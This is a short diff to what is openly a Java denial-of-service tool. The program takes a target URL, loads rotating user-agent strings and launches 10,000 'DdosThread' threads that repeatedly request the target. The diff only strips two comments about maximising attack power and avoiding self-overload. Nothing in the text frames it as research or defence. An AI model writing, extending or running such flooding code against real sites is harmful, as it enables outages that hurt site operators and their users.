@@ -18,7 +18,7 @@ String targetUrl = scanner.nextLine();
 List<String> userAgents = UserAgentFetcher.fetchUserAgents();
     System.out.println("Loaded " + userAgents.size() + " user agents.");
 
-    int threadsCount = 10000; // increase thread count for max power!
+    int threadsCount = 10000; 
     for (int i = 0; i < threadsCount; i++) {
         DdosThread thread = new DdosThread(targetUrl, userAgents);
         thread.start();
@@ -74,7 +74,7 @@ public static class DdosThread extends Thread {
 		
 		connection.getInputStream();
 		
-		Thread.sleep(random.nextInt(100));   // add small delay between attacks to avoid self-overload!
+		Thread.sleep(random.nextInt(100));   
 		
     }
 }
